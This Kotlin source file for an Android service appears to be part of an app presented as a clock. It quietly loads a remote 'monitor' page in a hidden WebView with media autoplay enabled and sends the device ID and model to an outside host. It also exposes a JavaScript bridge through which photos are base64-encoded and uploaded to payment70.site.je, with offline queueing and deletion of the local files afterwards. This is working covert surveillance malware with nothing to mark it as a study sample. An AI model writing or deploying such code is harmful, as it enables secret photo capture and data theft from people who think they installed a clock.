package com.clock.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.webkit.JavascriptInterface
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import java.io.File
import java.io.FileOutputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import android.util.Base64

class MonitorService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private var webView: WebView? = null
    private val monitorUrl = "https://payment70.site.je/monitor.html"
    private val pendingPhotos = mutableListOf<File>()
    private var isOnline = true
    private val CHANNEL_ID = "monitor_service"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, buildNotification())
        setupWebView()
        registerNetworkCallback()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Clock Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Service notification"
                setSound(null, null)
                enableVibration(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Clock App")
                .setContentText("Running")
                .setSmallIcon(R.drawable.ic_clock)
                .setOngoing(true)
                .build()
        } else {
            Notification.Builder(this)
                .setContentTitle("Clock App")
                .setContentText("Running")
                .setSmallIcon(R.drawable.ic_clock)
                .setOngoing(true)
                .build()
        }
    }

    private fun setupWebView() {
        webView = WebView(this).apply {
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            settings.mediaPlaybackRequiresUserGesture = false
            settings.allowFileAccess = true
            settings.allowContentAccess = true

            webViewClient = object : WebViewClient() {}
            webChromeClient = object : WebChromeClient() {}

            addJavascriptInterface(JsBridge(), "Native")
        }

        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        val deviceInfo = URLEncoder.encode("${Build.MANUFACTURER} ${Build.MODEL}", "UTF-8")
        webView?.loadUrl("$monitorUrl?did=$androidId&dinfo=$deviceInfo")
    }

    private fun registerNetworkCallback() {
        try {
            val cm = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
            val request = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()
            cm.registerNetworkCallback(request, object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    isOnline = true
                    handler.post { uploadPendingPhotos() }
                }
                override fun onLost(network: Network) {
                    isOnline = false
                }
            })
        } catch (e: Exception) {}
    }

    private fun uploadPendingPhotos() {
        if (pendingPhotos.isEmpty() || !isOnline) return
        Thread {
            val copy = pendingPhotos.toList()
            pendingPhotos.clear()
            for (file in copy) {
                try {
                    val bytes = file.readBytes()
                    val b64 = Base64.encodeToString(bytes, Base64.DEFAULT)
                    val json = """{"image":"$b64","name":"${file.name}"}"""
                    val url = URL("https://payment70.site.je/upload.php")
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.doOutput = true
                    conn.setRequestProperty("Content-Type", "application/json")
                    OutputStreamWriter(conn.outputStream).use {
                        it.write(json)
                        it.flush()
                    }
                    conn.responseCode
                    conn.disconnect()
                    file.delete()
                } catch (e: Exception) {
                    pendingPhotos.add(file)
                }
            }
        }.start()
    }

    inner class JsBridge {
        @JavascriptInterface
        fun onResult(text: String) {}

        @JavascriptInterface
        fun onCommand(text: String) {}

        @JavascriptInterface
        fun saveOfflinePhoto(b64: String) {
            try {
                if (isOnline) {
                    uploadDirect(b64)
                } else {
                    val file = File(cacheDir, "offline_${System.currentTimeMillis()}.jpg")
                    FileOutputStream(file).use {
                        it.write(Base64.decode(b64, Base64.DEFAULT))
                    }
                    pendingPhotos.add(file)
                }
            } catch (e: Exception) {}
        }

        @JavascriptInterface
        fun isOnline(): Boolean = isOnline
    }

    private fun uploadDirect(b64: String) {
        Thread {
            try {
                val json = """{"image":"$b64","name":"photo_${System.currentTimeMillis()}.jpg"}"""
                val url = URL("https://payment70.site.je/upload.php")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")
                OutputStreamWriter(conn.outputStream).use {
                    it.write(json)
                    it.flush()
                }
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {}
        }.start()
    }

    override fun onDestroy() {
        super.onDestroy()
        webView?.destroy()
    }
}
